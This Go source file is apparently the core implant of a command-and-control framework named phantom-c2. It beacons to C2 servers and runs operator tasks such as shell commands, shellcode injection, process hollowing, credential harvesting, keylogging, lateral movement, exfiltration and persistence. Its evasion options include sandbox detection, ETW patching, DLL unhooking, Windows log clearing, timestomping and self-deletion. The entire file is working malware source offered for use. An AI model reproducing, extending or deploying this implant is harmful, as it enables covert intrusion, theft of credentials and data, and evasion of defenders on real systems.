package implant

import (
	"crypto/rsa"
	"fmt"
	"os"
	"strconv"
	"strings"

	"github.com/phantom-c2/phantom/internal/protocol"
)

// chdir and getwd wrappers for cross-platform compatibility.
func chdir(path string) error { return os.Chdir(path) }
func getwd() (string, error) { return os.Getwd() }

// Implant is the core agent that runs on target systems.
type Implant struct {
	transport *Transport
	sleep     int
	jitter    int
	killDate  string
	results   []protocol.TaskResult
}

// selfCleanup performs cleanup on kill/kill-date to minimize forensic artifacts.
func selfCleanup() {
	// Try to remove the agent binary
	exe, err := os.Executable()
	if err == nil {
		os.Remove(exe)
	}
	// Clear environment
	os.Setenv("HISTSIZE", "0")
}

// Run is the main entry point for the implant.
// It handles registration, check-in loop, and task execution.
func Run(serverURL string, serverPub *rsa.PublicKey, sleepSec, jitterPct int, killDate string) {
	// Support comma-separated URLs for failover rotation
	rawURLs := strings.Split(serverURL, ",")
	urls := make([]string, 0, len(rawURLs))
	for _, u := range rawURLs {
		u = strings.TrimSpace(u)
		if u != "" {
			urls = append(urls, u)
		}
	}
	if len(urls) == 0 {
		urls = []string{serverURL}
	}

	imp := &Implant{
		transport: NewTransport(urls, serverPub),
		sleep:     sleepSec,
		jitter:    jitterPct,
		killDate:  killDate,
	}

	// Sandbox check
	if CheckSandbox() {
		// Sleep longer to evade analysis timeouts
		SleepWithJitter(300, 50)
	}

	// Kill date check
	if CheckKillDate(killDate) {
		return
	}

	// Run evasion techniques before any network activity
	// Disabled on startup for stability — can be triggered via 'evasion' command
	// InitEvasion()

	// Collect system info
	sysinfo := CollectSysInfo()

	// Registration loop (retry until successful)
	for {
		if CheckKillDate(imp.killDate) {
			return
		}

		err := imp.transport.Register(sysinfo)
		if err == nil {
			break
		}

		// Retry after sleep
		SleepWithJitter(imp.sleep, imp.jitter)
	}

	// Main check-in loop with stealth features
	failCount := 0
	for {
		if CheckKillDate(imp.killDate) {
			// Kill date passed — self-destruct
			selfCleanup()
			return
		}

		// Sleep with memory encryption (defeats memory scanners)
		SleepEncrypted(imp.sleep, imp.jitter, imp.transport.sessionKey)

		// Rotate JA3 fingerprint on each connection
		imp.transport.client = StealthHTTPClient()
		imp.transport.userAgent = RandomUserAgent()

		// Check in and get tasks
		tasks, err := imp.transport.CheckIn(imp.results)
		imp.results = nil // Clear sent results

		if err != nil {
			failCount++
			// Exponential backoff on failures (avoid flooding dead C2)
			backoff := ExponentialBackoff(failCount, imp.sleep)
			SleepWithJitter(int(backoff.Seconds()), imp.jitter)
			continue
		}
		failCount = 0 // Reset on success

		// Execute tasks
		for _, task := range tasks {
			result := imp.executeTask(task)
			if result != nil {
				imp.results = append(imp.results, *result)
			}

			// Check for kill command
			if task.Type == protocol.TaskKill {
				selfCleanup()
				return
			}
		}
	}
}

// executeTask dispatches a task to the appropriate handler.
func (imp *Implant) executeTask(task protocol.Task) *protocol.TaskResult {
	result := &protocol.TaskResult{
		TaskID:  task.ID,
		AgentID: imp.transport.GetAgentID(),
	}

	var output []byte
	var err error

	switch task.Type {
	case protocol.TaskShell:
		output, err = ExecuteShell(task.Args)

	case protocol.TaskUpload:
		if len(task.Args) > 0 && len(task.Data) > 0 {
			output, err = UploadFile(task.Args[0], task.Data)
		} else {
			err = errMissingArgs("upload requires remote path and file data")
		}

	case protocol.TaskDownload:
		if len(task.Args) > 0 {
			output, err = DownloadFile(task.Args[0])
		} else {
			err = errMissingArgs("download requires remote path")
		}

	case protocol.TaskScreenshot:
		output, err = CaptureScreenshot()

	case protocol.TaskProcessList:
		output, err = ListProcesses()

	case protocol.TaskSysinfo:
		output = []byte(DetailedSysInfo())

	case protocol.TaskPersist:
		if len(task.Args) > 0 {
			output, err = InstallPersistence(task.Args[0])
		} else {
			err = errMissingArgs("persist requires method name")
		}

	case protocol.TaskSleep:
		if len(task.Args) >= 1 {
			if s, e := strconv.Atoi(task.Args[0]); e == nil && s > 0 {
				imp.sleep = s
			}
			if len(task.Args) >= 2 {
				if j, e := strconv.Atoi(task.Args[1]); e == nil && j >= 0 {
					imp.jitter = j
				}
			}
			output = []byte("Sleep updated")
		}

	case protocol.TaskCd:
		if len(task.Args) > 0 {
			output, err = ChangeDirectory(task.Args[0])
		} else {
			err = errMissingArgs("cd requires path")
		}

	case protocol.TaskAD:
		if len(task.Args) > 0 {
			adCmds := GetADCommands()
			if adCmd, ok := adCmds[task.Args[0]]; ok {
				output, err = adCmd.Executor(task.Args[1:])
			} else {
				err = errMissingArgs("unknown AD command: " + task.Args[0])
			}
		} else {
			err = errMissingArgs("ad requires command name")
		}

	case protocol.TaskBOF:
		if len(task.Data) > 0 {
			var bofArgs []byte
			if len(task.Args) > 0 {
				bofArgs = PackBOFArgs(NewBOFStringArg(task.Args[0]))
			}
			output, err = ExecuteBOF(task.Data, bofArgs)
		} else {
			err = errMissingArgs("bof requires object file data")
		}

	case protocol.TaskShellcode:
		if len(task.Data) > 0 {
			err = executeShellcodeCrossPlatform(task.Data)
			if err == nil {
				output = []byte("[+] Shellcode executed in-memory")
			}
		} else {
			err = errMissingArgs("shellcode requires binary data")
		}

	case protocol.TaskInject:
		if len(task.Args) > 0 && len(task.Data) > 0 {
			pid := 0
			fmt.Sscanf(task.Args[0], "%d", &pid)
			err = injectShellcodeRemoteCrossPlatform(uint32(pid), task.Data)
			if err == nil {
				output = []byte(fmt.Sprintf("[+] Shellcode injected into PID %d", pid))
			}
		} else {
			err = errMissingArgs("inject requires PID and shellcode data")
		}

	case protocol.TaskHollow:
		if len(task.Args) > 0 && len(task.Data) > 0 {
			err = ProcessHollow(task.Args[0], task.Data)
			if err == nil {
				output = []byte(fmt.Sprintf("[+] Process hollowed: %s (payload injected and resumed)", task.Args[0]))
			}
		} else {
			err = errMissingArgs("hollow requires host process path and shellcode data")
		}

	case protocol.TaskEvasion:
		if len(task.Args) > 0 {
			switch task.Args[0] {
			case "timestomp":
				if len(task.Args) >= 3 {
					err = Timestomp(task.Args[1], task.Args[2])
					if err == nil {
						output = []byte("[+] Timestomped: " + task.Args[1] + " → matches " + task.Args[2])
					}
				} else {
					output = []byte("Usage: evasion timestomp <target-file> <reference-file>")
				}
			case "clearlogs":
				logResults := ClearWindowsLogs()
				output = []byte(strings.Join(logResults, "\n"))
			case "ppidspoof":
				parentPID, _ := FindProcessByName("explorer.exe")
				if parentPID > 0 {
					output = []byte(fmt.Sprintf("[+] Found explorer.exe PID: %d — ready for PPID spoofing", parentPID))
				} else {
					output = []byte("[-] Could not find explorer.exe for PPID spoofing")
				}
			case "syscalls":
				stub, stubErr := GetSyscallStub("NtAllocateVirtualMemory")
				if stubErr == nil {
					output = []byte(fmt.Sprintf("[+] NtAllocateVirtualMemory SSN: 0x%04X — indirect syscalls available", stub.SSN))
				} else {
					output = []byte("[-] Indirect syscalls: " + stubErr.Error())
				}
			case "advanced", "full", "edr":
				results := InitAdvancedEvasion()
				output = []byte(strings.Join(results, "\n"))
			case "unhookall":
				results := UnhookAllDLLs()
				output = []byte(strings.Join(results, "\n"))
			case "patchetw":
				results := PatchAllETW()
				output = []byte(strings.Join(results, "\n"))
			case "removepe":
				if err2 := RemovePEHeaders(); err2 == nil {
					output = []byte("[+] PE headers removed from memory — invisible to scanners")
				} else {
					output = []byte("[-] PE header removal failed: " + err2.Error())
				}
			case "blockdlls":
				if len(task.Args) > 1 {
					pid, err2 := SpawnWithBlockDLLs(task.Args[1])
					if err2 == nil {
						output = []byte(fmt.Sprintf("[+] Process spawned with BlockDLLs policy (PID: %d)\n[+] EDR DLLs blocked from injection", pid))
					} else {
						output = []byte("[-] BlockDLLs failed: " + err2.Error())
					}
				} else {
					output = []byte("Usage: evasion blockdlls <command>\nExample: evasion blockdlls notepad.exe")
				}
			case "stomp":
				if len(task.Args) > 1 {
					if err2 := ModuleStomp(task.Args[1]); err2 == nil {
						output = []byte(fmt.Sprintf("[+] Module stomped: %s — implant code now appears as legitimate DLL", task.Args[1]))
					} else {
						output = []byte("[-] Module stomp failed: " + err2.Error())
					}
				} else {
					output = []byte("Usage: evasion stomp <dll_name>\nExample: evasion stomp amsi.dll")
				}
			default:
				results := InitEvasion()
				output = []byte(strings.Join(results, "\n"))
			}
		} else {
			results := InitEvasion()
			output = []byte(strings.Join(results, "\n"))
		}

	case protocol.TaskPivot:
		output, err = ExecutePivotCommand(task.Args)

	case protocol.TaskToken:
		output, err = ExecuteTokenCommand(task.Args)

	case protocol.TaskKeylog:
		output, err = ExecuteKeyloggerCommand(task.Args)

	case protocol.TaskSocks:
		output, err = ExecuteProxyCommand(task.Args)

	case protocol.TaskPortFwd:
		output, err = ExecutePortFwdCommand(task.Args)

	case protocol.TaskCreds:
		target := "all"
		if len(task.Args) > 0 {
			target = task.Args[0]
		}
		output, err = HarvestCredentials(target)

	case protocol.TaskKill:
		output = []byte("Agent terminating")

	case protocol.TaskLateral:
		output, err = ExecuteLateralMovement(task.Args)

	case protocol.TaskExfil:
		output, err = ExecuteExfil(task.Args)

	case protocol.TaskAssembly:
		output, err = ExecuteAssembly(task.Args, task.Data)

	case protocol.TaskInitAccess:
		output, err = ExecuteInitAccess(task.Args)

	case protocol.TaskIfconfig:
		output, err = GetNetworkInterfaces()

	default:
		err = errMissingArgs("unknown task type")
	}

	if err != nil {
		result.Error = err.Error()
	}
	result.Output = output

	return result
}

type missingArgsError struct{ msg string }

func (e *missingArgsError) Error() string { return e.msg }

func errMissingArgs(msg string) error {
	return &missingArgsError{msg: msg}
}
